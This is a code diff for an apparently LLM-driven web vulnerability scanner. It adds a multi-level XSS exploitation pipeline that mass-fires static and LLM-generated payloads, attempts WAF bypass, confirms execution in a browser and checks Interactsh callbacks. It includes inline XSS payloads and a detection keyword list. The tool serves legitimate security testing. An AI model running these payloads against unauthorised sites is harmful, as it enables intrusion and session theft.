+            try:
+                soup = BeautifulSoup(html, "html.parser")
+                base_domain = urlparse(url).netloc
+                internal_urls = set()
+                for a_tag in soup.find_all("a", href=True):
+                    href = a_tag["href"]
+                    if href.startswith(("javascript:", "mailto:", "#", "tel:")):
+                        continue
+                    link = urljoin(url, href)
+                    parsed_link = urlparse(link)
+                    if parsed_link.netloc == base_domain and parsed_link.scheme in ("http", "https"):
+                        clean_link = f"{parsed_link.scheme}://{parsed_link.netloc}{parsed_link.path}"
+                        if clean_link != url.split("?")[0]:
+                            internal_urls.add(clean_link)
+                self._discovered_internal_urls = list(internal_urls)[:3]
+                if self._discovered_internal_urls:
+                    logger.info(f"[{self.name}] Discovered {len(self._discovered_internal_urls)} internal URLs for DOM XSS")
+            except Exception:
+                pass
+
+        # Log detected methods
+        post_params = [p for p, m in self._param_methods.items() if m == "POST"]
+        if post_params:
+            logger.info(f"[{self.name}] 📮 POST params detected: {post_params}")
+
+        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
+        return all_params
+
     async def exploit_dry_list(self) -> List[Dict]:
         logger.info(f"[{self.name}] ===== PHASE B: Exploiting {len(self._dry_findings)} DRY findings =====")
+
+        # Setup Interactsh
+        if not self.interactsh:
+            try:
+                self.interactsh = InteractshClient()
+                await self.interactsh.register()
+            except Exception as e:
+                logger.warning(f"[{self.name}] Interactsh init failed: {e}")
+
+        interactsh_url = ""
+        if self.interactsh:
+            try:
+                interactsh_url = self.interactsh.get_url() if hasattr(self.interactsh, 'get_url') else ""
+            except Exception:
+                pass
+
+        # Screenshots dir
+        screenshots_dir = self.report_dir / "captures"
+        screenshots_dir.mkdir(parents=True, exist_ok=True)
+
         validated = []
         for idx, f in enumerate(self._dry_findings, 1):
             try:
                 self.url = f["url"]
-                # v3.2: Pass recommended_payload_type from LLM dedup (template for Angular/Vue)
-                payload_type = f.get("recommended_payload_type")
-                result = await self._test_single_param_from_queue(f["url"], f["parameter"], f.get("finding",{}), payload_type)
-                # v3.2: XSSFinding is a dataclass - use attribute access, not .get()
+                param_name = f["parameter"]
+
+                # Read reflection context and HTTP method from DRY finding
+                finding_context = f.get("context", "html")
+                probe_snippet = f.get("_probe_snippet", "")
+                http_method = f.get("http_method", "GET")
+
+                # Log LLM attack strategy if available
+                attack_strategy = f.get("attack_strategy", "")
+                if attack_strategy:
+                    logger.info(f"[{self.name}] LLM strategy for '{param_name}': {attack_strategy}")
+
+                logger.info(f"[{self.name}] [{idx}/{len(self._dry_findings)}] Testing '{param_name}' on {self.url} (method: {http_method}, context: {finding_context})")
+
+                # v3.4: 6-Level Escalation Pipeline
+                result = await self._xss_escalation_pipeline(
+                    self.url, param_name, interactsh_url, screenshots_dir,
+                    context=finding_context, probe_snippet=probe_snippet,
+                    http_method=http_method
+                )
+
                 if result and result.validated:
                     validated.append(result)
-                    fp = self._generate_xss_fingerprint(f["url"], f["parameter"], result.context or "html")
+                    fp = self._generate_xss_fingerprint(self.url, param_name, result.context or "html")
                     if fp not in self._emitted_findings:
                         self._emitted_findings.add(fp)
-                        if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
-                            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
-                                "specialist": "xss",
-                                "finding": {"type": "XSS", "url": result.url, "parameter": result.parameter, "payload": result.payload, "context": result.context},
-                                "status": result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
-                                "validation_requires_cdp": False,  # v3.2.1: CDP disabled
-                                "scan_context": self._scan_context,
-                            })
-                        logger.info(f"[{self.name}] ✅ Emitted unique XSS: {f['url']}?{f['parameter']} (context: {result.context or 'html'})")
+                        needs_cdp = (result.status == "NEEDS_CDP_VALIDATION")
+                        finding_dict = {
+                            "type": "XSS",
+                            "url": result.url,
+                            "parameter": result.parameter,
+                            "payload": result.payload,
+                            "context": result.context,
+                            "evidence": {"validated": True, "level": result.evidence.get("level", "unknown")}
+                        }
+                        self._emit_xss_finding(
+                            finding_dict,
+                            status=result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
+                            needs_cdp=needs_cdp
+                        )
+                        logger.info(f"[{self.name}] ✅ Emitted XSS: {self.url}?{param_name} (level: {result.evidence.get('level', '?')}, context: {result.context or 'html'})")
             except Exception as e:
                 logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: {e}")
         logger.info(f"[{self.name}] Phase B complete: {len(validated)} validated")
+
+        # Phase B.2: DOM XSS testing (Playwright) - tests self.url + discovered internal URLs
+        try:
+            screenshots_dir = None
+            if hasattr(self, 'report_dir') and self.report_dir:
+                screenshots_dir = Path(self.report_dir) / "screenshots"
+                screenshots_dir.mkdir(parents=True, exist_ok=True)
+            await self._loop_test_dom_xss(screenshots_dir=screenshots_dir)
+            # Collect DOM XSS findings and emit them
+            for f in self.findings:
+                if f.context == "dom_xss" and f.validated:
+                    fp = self._generate_xss_fingerprint(f.url, f.parameter, "dom_xss")
+                    if fp not in self._emitted_findings:
+                        self._emitted_findings.add(fp)
+                        finding_dict = {
+                            "type": "XSS",
+                            "subtype": "DOM_XSS",
+                            "url": f.url,
+                            "parameter": f.parameter,
+                            "payload": f.payload,
+                            "context": "dom_xss",
+                            "evidence": f.evidence or {"validated": True, "level": "dom_xss"}
+                        }
+                        self._emit_xss_finding(
+                            finding_dict,
+                            status=f.status or ValidationStatus.VALIDATED_CONFIRMED.value,
+                            needs_cdp=False
+                        )
+                        validated.append(f)
+                        logger.info(f"[{self.name}] ✅ Emitted DOM XSS: {f.url} (source: {f.parameter})")
+        except Exception as e:
+            logger.error(f"[{self.name}] Phase B.2 DOM XSS testing failed: {e}", exc_info=True)
+
         return validated
+
+    async def _xss_escalation_pipeline(
+        self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
+        context: str = "html", probe_snippet: str = "",
+        http_method: str = "GET"
+    ) -> Optional[XSSFinding]:
+        """
+        v3.5: Smart XSS Escalation Pipeline.
+
+        L0.5: Smart probe      → reflection + context-specific payloads (1-6 reqs)
+        L1: Polyglot probe     → HTTP reflection check (instant)
+        L2: Bombing 1 (static) → Curated + GOLDEN payloads via HTTP
+        L3: Bombing 2 (LLM)    → 100 LLM payloads × breakouts (SKIPPED if L2=0 reflections)
+        L4: HTTP Manipulator   → ManipulatorOrchestrator (SKIPPED if L2=0 reflections)
+        L5: Browser testing    → Playwright DOM execution
+        L6: CDP Validation     → Flag for AgenticValidator
+        """
+        self._current_http_method = http_method  # Used by _send_payload()
+        reflecting_payloads = []  # Payloads that reflect but aren't confirmed - passed to L5/L6
+
+        def _tag_method(finding):
+            """Tag finding with HTTP method before returning."""
+            if finding and hasattr(finding, 'http_method'):
+                finding.http_method = http_method
+            return finding
+
+        # ===== L0.5: SMART PROBE =====
+        dashboard.log(f"[{self.name}] L0.5: Smart probe on '{param}' (context: {context})", "INFO")
+        smart_result, reflects, smart_ctx = await self._escalation_l05_smart_probe(url, param, context)
+        if smart_result and smart_result.validated:
+            return _tag_method(smart_result)
+        if not reflects:
+            dashboard.log(f"[{self.name}] Smart probe: no reflection for '{param}', skipping all levels", "INFO")
+            return None
+        if smart_ctx and smart_ctx not in ("unknown", "none", "blocked"):
+            context = smart_ctx
+
+        # ===== L1: POLYGLOT PROBE =====
+        dashboard.log(f"[{self.name}] L1: Polyglot probe on '{param}' (context: {context})", "INFO")
+        result, detected_context, l1_snippet = await self._escalation_l1_polyglot(url, param, interactsh_url, context)
+        if result and result.validated:
+            return _tag_method(result)
+        # L1 may refine the context from live response analysis
+        if detected_context and detected_context != "html":
+            context = detected_context
+        if l1_snippet:
+            probe_snippet = l1_snippet
+
+        # ===== L2: BOMBING 1 - STATIC PAYLOADS =====
+        dashboard.log(f"[{self.name}] L2: Static bombardment on '{param}' (context: {context})", "INFO")
+        result, l2_reflecting = await self._escalation_l2_static_bombing(url, param, interactsh_url, context)
+        if result and result.validated:
+            return _tag_method(result)
+        reflecting_payloads.extend(l2_reflecting)
+
+        # ===== SKIP L3+L4 if L2 found 0 reflecting payloads =====
+        if not reflecting_payloads:
+            dashboard.log(f"[{self.name}] L2: 0 reflections, skipping L3+L4 for '{param}'", "INFO")
+        else:
+            # ===== L3: BOMBING 2 - LLM PAYLOADS × BREAKOUTS =====
+            dashboard.log(f"[{self.name}] L3: LLM bombardment on '{param}' (context: {context})", "INFO")
+            result, l3_reflecting = await self._escalation_l3_llm_bombing(
+                url, param, interactsh_url, reflecting_payloads,
+                context=context, probe_snippet=probe_snippet
+            )
+            if result and result.validated:
+                return _tag_method(result)
+            reflecting_payloads.extend(l3_reflecting)
+
+            # ===== L4: HTTP MANIPULATOR =====
+            dashboard.log(f"[{self.name}] L4: HTTP Manipulator on '{param}'", "INFO")
+            result, l4_reflecting = await self._escalation_l4_http_manipulator(url, param)
+            if result and result.validated:
+                return _tag_method(result)
+            reflecting_payloads.extend(l4_reflecting)
+
+        # ===== L5: BROWSER TESTING (Playwright) =====
+        # Skip for POST params (Playwright form submission not supported yet)
+        if reflecting_payloads and http_method == "GET":
+            dashboard.log(f"[{self.name}] L5: Browser testing {len(reflecting_payloads)} candidates on '{param}'", "INFO")
+            result = await self._escalation_l5_browser(url, param, reflecting_payloads, screenshots_dir)
+            if result and result.validated:
+                return _tag_method(result)
+        elif reflecting_payloads and http_method == "POST":
+            logger.info(f"[{self.name}] L5: Skipping browser test for POST param '{param}'")
+
+        # ===== L6: CDP VALIDATION (AgenticValidator) =====
+        if reflecting_payloads:
+            dashboard.log(f"[{self.name}] L6: Flagging for CDP AgenticValidator on '{param}'", "INFO")
+            result = await self._escalation_l6_cdp(url, param, reflecting_payloads)
+            if result:
+                return _tag_method(result)
+
+        dashboard.log(f"[{self.name}] All 6 levels exhausted for '{param}', no XSS confirmed", "WARN")
+        return None
+
+    # ===== ESCALATION LEVEL IMPLEMENTATIONS =====
+
+    async def _escalation_l05_smart_probe(
+        self, url: str, param: str, initial_context: str = "html"
+    ) -> tuple:
+        """
+        L0.5: Smart Probe — send char-test probe, detect reflection context,
+        try 3-5 targeted payloads based on what survives.
+
+        Returns:
+            (XSSFinding or None, reflects: bool, detected_context: str or None)
+        """
+        # Send char-testing probe
+        probe = 'BT7331"\'<>`\\'
+        response = await self._send_payload(param, probe)
+        if not response or "BT7331" not in response:
+            return None, False, None
+
+        # Detect surviving chars from reflected snippet (precise: adjacent to marker only)
+        idx = response.find("BT7331")
+        snippet = response[idx:idx + 30]
+        surviving = ""
+        for char in ['"', "'", '<', '>', '`', '\\']:
+            if char in snippet:
+                surviving += char
+
+        # Detect context via existing analysis
+        reflection_info = self._analyze_reflection_context(response, "BT7331")
+        detected_context = reflection_info.get("context", initial_context)
+
+        dashboard.log(
+            f"[{self.name}] Smart probe: '{param}' reflects, "
+            f"context={detected_context}, chars_survive={surviving}",
+            "INFO",
+        )
+
+        # Select targeted payloads based on context + surviving chars
+        smart = []
+        if detected_context == "script":
+            smart.append(self.SMART_PAYLOADS["js_sq_breakout"])
+            smart.append(self.SMART_PAYLOADS["js_dq_breakout"])
+        elif detected_context == "attribute_value":
+            if '"' in surviving:
+                smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
+            if "'" in surviving:
+                smart.append(self.SMART_PAYLOADS["attr_sq_breakout"])
+            if '<' in surviving:
+                smart.append(self.SMART_PAYLOADS["html_svg"])
+        elif detected_context in ("html_text", "unknown"):
+            if '<' in surviving:
+                smart.append(self.SMART_PAYLOADS["html_svg"])
+                smart.append(self.SMART_PAYLOADS["html_img"])
+            if '"' in surviving:
+                smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
+        elif detected_context == "comment":
+            smart.append("--><svg onload=document.title=document.domain>")
+
+        # Always try script breakout if < survives
+        if '<' in surviving and self.SMART_PAYLOADS["script_breakout"] not in smart:
+            smart.append(self.SMART_PAYLOADS["script_breakout"])
+
+        # Dedupe and limit to 5
+        smart = list(dict.fromkeys(smart))[:5]
+
+        if not smart:
+            return None, True, detected_context
+
+        # Test smart payloads
+        dashboard.log(
+            f"[{self.name}] Smart probe: testing {len(smart)} targeted payloads on '{param}'",
+            "INFO",
+        )
+        for payload in smart:
+            resp = await self._send_payload(param, payload)
+            if resp:
+                evidence = {}
+                if self._can_confirm_from_http_response(payload, resp, evidence):
+                    dashboard.log(
+                        f"[{self.name}] Smart probe: CONFIRMED XSS on '{param}'",
+                        "INFO",
+                    )
+                    finding = XSSFinding(
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        context=detected_context,
+                        validation_method="L0.5_smart_probe",
+                        evidence={**evidence, "level": "L0.5", "surviving_chars": surviving},
+                        confidence=0.9,
+                        status="VALIDATED_CONFIRMED",
+                        validated=True,
+                    )
+                    finding.successful_payloads = [payload]
+                    return finding, True, detected_context
+
+        return None, True, detected_context
+
+    async def _escalation_l1_polyglot(
+        self, url: str, param: str, interactsh_url: str, initial_context: str = "html"
+    ) -> tuple:
+        """
+        L1: Send polyglot/omniprobe, check HTTP reflection.
+
+        Returns:
+            (XSSFinding or None, detected_context, html_snippet)
+            - detected_context: refined context from live response analysis
+            - html_snippet: HTML around the reflection point for L3 LLM
+        """
+        probe = settings.OMNI_PROBE_MARKER
+        response = await self._send_payload(param, probe)
+        if not response:
+            return None, initial_context, ""
+
+        # Check if probe reflects at all
+        if probe not in response:
+            logger.info(f"[{self.name}] L1: No reflection for '{param}'")
+            return None, initial_context, ""
+
+        # Analyze reflection context from live response
+        detected_context = initial_context
+        html_snippet = ""
+        try:
+            reflection = self._analyze_reflection_context(response, probe)
+            if reflection:
+                detected_context = reflection.get("context", initial_context)
+                html_snippet = reflection.get("snippet", "")[:500]
+                if detected_context != initial_context:
+                    logger.info(
+                        f"[{self.name}] L1: Context refined: {initial_context} → {detected_context}"
+                    )
+        except Exception as e:
+            logger.debug(f"[{self.name}] L1: Context analysis failed: {e}")
+
+        # Probe reflects - check if any executable context
+        evidence = {}
+        if self._can_confirm_from_http_response(probe, response, evidence):
+            return XSSFinding(
+                url=url, parameter=param, payload=probe, context=evidence.get("execution_context", "html"),
+                validation_method="L1_polyglot", evidence={**evidence, "level": "L1"},
+                confidence=0.85, status="VALIDATED_CONFIRMED", validated=True
+            ), detected_context, html_snippet
+
+        # Check Interactsh OOB
+        if self.interactsh:
+            try:
+                interactions = await self.interactsh.poll()
+                if interactions:
+                    return XSSFinding(
+                        url=url, parameter=param, payload=probe, context="oob",
+                        validation_method="L1_interactsh", evidence={"oob": True, "level": "L1"},
+                        confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
+                    ), detected_context, html_snippet
+            except Exception:
+                pass
+
+        logger.info(f"[{self.name}] L1: Probe reflects but not confirmed for '{param}' (context: {detected_context})")
+        return None, detected_context, html_snippet
+
+    async def _ensure_go_bridge(self) -> bool:
+        """Lazy-initialize Go bridge for L2 acceleration. Returns True if available."""
+        if self._go_bridge:
+            return True
+        try:
+            concurrency = 50 if not self._detected_waf else 10
+            timeout = 5 if not self._detected_waf else 10
+            self._go_bridge = GoFuzzerBridge(concurrency=concurrency, timeout=timeout)
+            await self._go_bridge.compile_if_needed()
+            logger.info(f"[{self.name}] Go bridge initialized for L2 (concurrency={concurrency})")
+            return True
+        except Exception as e:
+            logger.info(f"[{self.name}] Go bridge unavailable, using Python fallback: {e}")
+            self._go_bridge = None
+            return False
+
+    async def _escalation_l2_static_bombing(
+        self, url: str, param: str, interactsh_url: str, context: str = "html"
+    ) -> tuple:
+        """L2: Fire all curated + GOLDEN payloads. Returns (result, reflecting_payloads).
+
+        Uses Go fuzzer for mass reflection detection (50 concurrent goroutines, ~3s),
+        then Python only for confirming the reflecting payloads (~5-10s).
+        Falls back to pure Python if Go bridge unavailable.
+        """
+        # Build payload list: curated first, then GOLDEN
+        curated = self.payload_learner.get_prioritized_payloads([])
+        golden = [p.replace("{{interactsh_url}}", interactsh_url) for p in self.GOLDEN_PAYLOADS]
+        curated = [p.replace("{{interactsh_url}}", interactsh_url) for p in curated]
+
+        # Context-aware prioritization: context-specific payloads FIRST
+        context_payloads = []
+        if context and context != "html":
+            try:
+                context_payloads = self.get_payloads_for_context(context, interactsh_url)
+                if context_payloads:
+                    logger.info(
+                        f"[{self.name}] L2: Prioritizing {len(context_payloads)} "
+                        f"payloads for context '{context}'"
+                    )
+            except Exception as e:
+                logger.debug(f"[{self.name}] L2: Context payload lookup failed: {e}")
+
+        # Merge and dedupe: context-specific → golden (high quality) → curated
+        seen = set()
+        all_payloads = []
+        for p in context_payloads + golden + curated:
+            if p not in seen:
+                seen.add(p)
+                all_payloads.append(p)
+
+        logger.info(f"[{self.name}] L2: Bombing {len(all_payloads)} static payloads on '{param}'")
+
+        # ===== TRY GO BRIDGE (fast path: ~3s for 870 payloads) =====
+        # Go bridge only supports GET — skip for POST params
+        method = getattr(self, '_current_http_method', 'GET')
+        go_available = await self._ensure_go_bridge() if method == "GET" else False
+        if method == "POST":
+            logger.info(f"[{self.name}] L2: Skipping Go bridge for POST param '{param}', using Python")
+        if go_available:
+            try:
+                result, reflecting = await self._l2_go_fast_path(
+                    url, param, all_payloads, interactsh_url, context
+                )
+                if result:
+                    return result, reflecting
+
+                # Go path completed - check Interactsh and return
+                interactsh_result = await self._l2_check_interactsh(url, param, reflecting)
+                if interactsh_result:
+                    return interactsh_result, reflecting
+
+                logger.info(f"[{self.name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
+                return None, reflecting
+            except Exception as e:
+                logger.warning(f"[{self.name}] L2: Go bridge failed ({e}), falling back to Python")
+
+        # ===== PYTHON FALLBACK (slow path: ~150s for 870 payloads) =====
+        logger.info(f"[{self.name}] L2: Using Python fallback for {len(all_payloads)} payloads")
+        result, reflecting = await self._l2_python_fallback(
+            url, param, all_payloads, interactsh_url
+        )
+        if result:
+            return result, reflecting
+
+        interactsh_result = await self._l2_check_interactsh(url, param, reflecting)
+        if interactsh_result:
+            return interactsh_result, reflecting
+
+        logger.info(f"[{self.name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
+        return None, reflecting
+
+    async def _l2_go_fast_path(
+        self, url: str, param: str, payloads: list, interactsh_url: str, context: str
+    ) -> tuple:
+        """Go fast path: mass fuzz with Go, confirm reflecting with Python.
+
+        Go fires all 870 payloads in ~3s with 50 goroutines, returns which ones
+        reflected. Python then re-tests ONLY those (~5-30) with full HTTP analysis.
+        """
+        import time
+        start = time.time()
+
+        # Step 1: Go mass fuzzing (all payloads in parallel)
+        go_result = await self._go_bridge.run(
+            url=url, param=param, payloads=payloads
+        )
+
+        go_duration = time.time() - start
+        reflecting_payloads = [r.payload for r in (go_result.reflections or [])]
+
+        logger.info(
+            f"[{self.name}] L2-Go: {go_result.total_requests} payloads tested in "
+            f"{go_duration:.1f}s ({go_result.requests_per_second:.0f} req/s), "
+            f"{len(reflecting_payloads)} reflecting"
+        )
+
+        if not reflecting_payloads:
+            return None, []
+
+        # Prioritize: payloads with document.domain/cookie first (higher impact proof)
+        def _payload_quality_key(p):
+            if "document.domain" in p or "document.cookie" in p:
+                return 0
+            if "BUGTRACEAI" in p or "BUGTRACE" in p:
+                return 1
+            return 2
+
+        reflecting_payloads.sort(key=_payload_quality_key)
+
+        # Step 2: Python confirms reflecting payloads (full HTTP analysis)
+        logger.info(
+            f"[{self.name}] L2-Py: Confirming {len(reflecting_payloads)} "
+            f"reflecting payloads with full HTTP analysis"
+        )
+
+        confirmed_reflecting = []
+        confirmed_payloads = []
+        first_finding = None
+
+        for i, payload in enumerate(reflecting_payloads):
+            dashboard.set_current_payload(
+                payload[:60], "XSS L2-Confirm",
+                f"{i+1}/{len(reflecting_payloads)}", self.name
+            )
+
+            response = await self._send_payload(param, payload)
+            if not response:
+                continue
+
+            # Full HTTP confirmation (5 checks including JS string breakout)
+            evidence = {}
+            if self._can_confirm_from_http_response(payload, response, evidence):
+                confirmed_payloads.append(payload)
+                if not first_finding:
+                    first_finding = XSSFinding(
+                        url=url, parameter=param, payload=payload,
+                        context=evidence.get("execution_context", "html"),
+                        validation_method="L2_go_static_http",
+                        evidence={**evidence, "level": "L2", "engine": "go+python"},
+                        confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
+                    )
+                    logger.info(
+                        f"[{self.name}] L2: CONFIRMED via Go+Python in "
+                        f"{time.time() - start:.1f}s (context: {evidence.get('execution_context', 'unknown')})"
+                    )
+                if len(confirmed_payloads) >= 5:
+                    break
+                continue
+
+            # Track as reflecting for L5 browser fallback
+            if self._payload_reflects(payload, response):
+                confirmed_reflecting.append(payload)
+
+        if first_finding:
+            first_finding.successful_payloads = confirmed_payloads
+            logger.info(
+                f"[{self.name}] L2: {len(confirmed_payloads)} alternative payloads confirmed "
+                f"for '{param}'"
+            )
+            return first_finding, confirmed_reflecting
+
+        return None, confirmed_reflecting
+
+    async def _l2_python_fallback(
+        self, url: str, param: str, payloads: list, interactsh_url: str
+    ) -> tuple:
+        """Pure Python fallback: sequential HTTP requests with analysis."""
+        reflecting = []
+        confirmed_payloads = []
+        first_finding = None
+
+        for i, payload in enumerate(payloads):
+            if i % 50 == 0 and i > 0:
+                dashboard.log(f"[{self.name}] L2: Progress {i}/{len(payloads)}", "DEBUG")
+            dashboard.set_current_payload(payload[:60], "XSS L2", f"{i+1}/{len(payloads)}", self.name)
+
+            response = await self._send_payload(param, payload)
+            if not response:
+                continue
+
+            evidence = {}
+            if self._can_confirm_from_http_response(payload, response, evidence):
+                confirmed_payloads.append(payload)
+                if not first_finding:
+                    first_finding = XSSFinding(
+                        url=url, parameter=param, payload=payload,
+                        context=evidence.get("execution_context", "html"),
+                        validation_method="L2_static_http",
+                        evidence={**evidence, "level": "L2"},
+                        confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
+                    )
+                if len(confirmed_payloads) >= 5:
+                    break
+                continue
+
+            if self._payload_reflects(payload, response):
+                reflecting.append(payload)
+
+        if first_finding:
+            first_finding.successful_payloads = confirmed_payloads
+            return first_finding, reflecting
+
+        return None, reflecting
+
+    async def _l2_check_interactsh(self, url: str, param: str, reflecting: list):
+        """Check Interactsh for OOB callbacks after L2 bombing."""
+        if self.interactsh:
+            try:
+                interactions = await self.interactsh.poll()
+                if interactions:
+                    for rp in reflecting:
+                        if "interactsh" in rp.lower():
+                            return XSSFinding(
+                                url=url, parameter=param, payload=rp, context="oob",
+                                validation_method="L2_interactsh",
+                                evidence={"oob": True, "level": "L2"},
+                                confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
+                            )
+            except Exception:
+                pass
+        return None
+
+    async def _escalation_l3_llm_bombing(
+        self, url: str, param: str, interactsh_url: str, existing_reflecting: list,
+        context: str = "html", probe_snippet: str = ""
+    ) -> tuple:
+        """L3: Generate 100 LLM payloads, multiply by breakouts, fire via HTTP."""
+        # Use context from L1 analysis, or analyze from existing reflections
+        sample_context = context if context != "html" else "html"
+        html_snippet = probe_snippet
+
+        if sample_context == "html" and existing_reflecting:
+            sample_resp = await self._send_payload(param, existing_reflecting[0])
+            if sample_resp:
+                ctx = self._analyze_reflection_context(sample_resp, existing_reflecting[0])
+                if ctx:
+                    sample_context = ctx.get("context", "html")
+                    html_snippet = ctx.get("snippet", "")[:500]
+
+        # Ask DeepSeek for visual payloads tailored to context (with HTML snippet)
+        visual_payloads = await self._ask_deepseek_visual_payloads(
+            param=param, contexts=[sample_context],
+            sample_payloads={sample_context: existing_reflecting[0] if existing_reflecting else "<img src=x onerror=alert(1)>"},
+            html_snippet=html_snippet
+        )
+
+        if not visual_payloads:
+            logger.info(f"[{self.name}] L3: LLM generated 0 payloads, skipping")
+            return None, []
+
+        # Multiply by breakouts from breakout_manager
+        from bugtrace.tools.manipulator.breakout_manager import breakout_manager
+        breakouts = breakout_manager.get_top_breakouts(limit=10)
+        breakout_prefixes = [b.prefix for b in breakouts if b.prefix]
+
+        amplified = []
+        for vp in visual_payloads:
+            amplified.append(vp)  # Base payload
+            for prefix in breakout_prefixes[:10]:  # Top 10 breakouts
+                amplified.append(prefix + vp)
+
+        logger.info(f"[{self.name}] L3: Bombing {len(amplified)} LLM×breakout payloads on '{param}'")
+
+        reflecting = []
+        for i, payload in enumerate(amplified):
+            if i % 100 == 0 and i > 0:
+                dashboard.log(f"[{self.name}] L3: Progress {i}/{len(amplified)}", "DEBUG")
+            dashboard.set_current_payload(payload[:60], "XSS L3", f"{i+1}/{len(amplified)}", self.name)
+
+            response = await self._send_payload(param, payload)
+            if not response:
+                continue
+
+            evidence = {}
+            if self._can_confirm_from_http_response(payload, response, evidence):
+                return XSSFinding(
+                    url=url, parameter=param, payload=payload, context=evidence.get("execution_context", "html"),
+                    validation_method="L3_llm_http", evidence={**evidence, "level": "L3"},
+                    confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
+                ), reflecting
+
+            if self._payload_reflects(payload, response):
+                reflecting.append(payload)
+
+        logger.info(f"[{self.name}] L3: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
+        return None, reflecting
+
+    async def _escalation_l4_http_manipulator(
+        self, url: str, param: str
+    ) -> tuple:
+        """L4: ManipulatorOrchestrator - context detection, WAF bypass, blood smell."""
+        reflecting = []
+        try:
+            method = getattr(self, '_current_http_method', 'GET')
+            parsed = urllib.parse.urlparse(url)
+            base_params = dict(urllib.parse.parse_qsl(parsed.query))
+            if param not in base_params:
+                base_params[param] = "test"
+
+            if method == "POST":
+                base_request = MutableRequest(
+                    method="POST",
+                    url=url.split("?")[0],
+                    params={},
+                    data=base_params
+                )
+            else:
+                base_request = MutableRequest(
+                    method="GET",
+                    url=url.split("?")[0],
+                    params=base_params
+                )
+
+            manipulator = ManipulatorOrchestrator(
+                rate_limit=0.3,
+                enable_agentic_fallback=True,
+                enable_llm_expansion=True
+            )
+
+            success, mutation = await manipulator.process_finding(
+                base_request,
+                strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
+            )
+
+            if success and mutation:
+                working_payload = mutation.params.get(param, str(mutation.params))
+                original_value = base_params.get(param, "test")
+
+                # Verify the TARGET param was actually mutated (not a different param)
+                if working_payload == original_value:
+                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator exploited different param, not '{param}'")
+                    await manipulator.shutdown()
+                    return None, reflecting
+
+                # Verify payload contains XSS indicators
+                xss_indicators = ["<script", "<img", "<svg", "<iframe", "onerror", "onload",
+                                  "onclick", "onmouseover", "onfocus", "javascript:", "alert(",
+                                  "confirm(", "prompt(", "document.", "eval(", "<div", "<body",
+                                  "style=", "expression(", "\\x", "\\u00"]
+                if not any(ind.lower() in working_payload.lower() for ind in xss_indicators):
+                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator payload rejected (no XSS syntax): {working_payload[:80]}")
+                    await manipulator.shutdown()
+                    return None, reflecting
+
+                logger.info(f"[{self.name}] L4: ManipulatorOrchestrator CONFIRMED: {param}={working_payload[:80]}")
+                await manipulator.shutdown()
+                return XSSFinding(
+                    url=url, parameter=param, payload=working_payload, context="html",
+                    validation_method="L4_manipulator_http", evidence={"http_confirmed": True, "level": "L4"},
+                    confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
+                ), reflecting
+
+            # Collect blood smell candidates as reflecting payloads for L5
+            if manipulator.blood_smell_history:
+                for entry in sorted(manipulator.blood_smell_history, key=lambda x: x["smell"]["severity"], reverse=True)[:5]:
+                    blood_payload = entry["request"].params.get(param, "")
+                    if blood_payload:
+                        reflecting.append(blood_payload)
+                logger.info(f"[{self.name}] L4: {len(reflecting)} blood smell candidates for L5")
+
+            await manipulator.shutdown()
+
+        except Exception as e:
+            logger.error(f"[{self.name}] L4: ManipulatorOrchestrator failed: {e}")
+
+        return None, reflecting
+
+    async def _escalation_l5_browser(
+        self, url: str, param: str, reflecting_payloads: list, screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """L5: Browser validation (Playwright) on reflecting payloads."""
+        # Dedupe and take top candidates
+        seen = set()
+        candidates = []
+        for p in reflecting_payloads:
+            if p not in seen:
+                seen.add(p)
+                candidates.append(p)
+
+        # Limit to top 10 browser tests (expensive)
+        candidates = candidates[:10]
+        logger.info(f"[{self.name}] L5: Browser testing {len(candidates)} reflecting payloads on '{param}'")
+
+        for i, payload in enumerate(candidates):
+            dashboard.set_current_payload(payload[:60], "XSS L5 Browser", f"{i+1}/{len(candidates)}", self.name)
+            try:
+                browser_result = await self._validate_via_browser(url, param, payload)
+                if browser_result:
+                    return XSSFinding(
+                        url=url, parameter=param, payload=payload, context="dom",
+                        validation_method="L5_browser", evidence={**browser_result, "level": "L5"},
+                        confidence=0.95, status="VALIDATED_CONFIRMED", validated=True
+                    )
+            except Exception as e:
+                logger.debug(f"[{self.name}] L5: Browser test {i+1} failed: {e}")
+
+        logger.info(f"[{self.name}] L5: 0/{len(candidates)} confirmed in browser for '{param}'")
+        return None
+
+    async def _escalation_l6_cdp(
+        self, url: str, param: str, reflecting_payloads: list
+    ) -> Optional[XSSFinding]:
+        """L6: Flag best reflecting payload for CDP AgenticValidator."""
+        if not reflecting_payloads:
+            return None
+
+        # Pick best candidate (first one, which came from highest priority level)
+        best_payload = reflecting_payloads[0]
+        logger.info(f"[{self.name}] L6: Flagging '{param}' for CDP AgenticValidator (payload: {best_payload[:60]})")
+
+        return XSSFinding(
+            url=url, parameter=param, payload=best_payload, context="pending_cdp",
+            validation_method="L6_cdp_flagged", evidence={"reflecting": True, "level": "L6", "needs_cdp": True},
+            confidence=0.5, status="NEEDS_CDP_VALIDATION", validated=True
+        )
 
     async def _generate_specialist_report(self, findings: List[Dict]) -> str:
         import json, aiofiles
@@ -3346,6 +4423,7 @@ Return ONLY the payloads, one per line, no explanations."""
             report_specialist_progress,
             report_specialist_done,
             report_specialist_wet_dry,
+            write_dry_file,
         )
 
         self._queue_mode = True
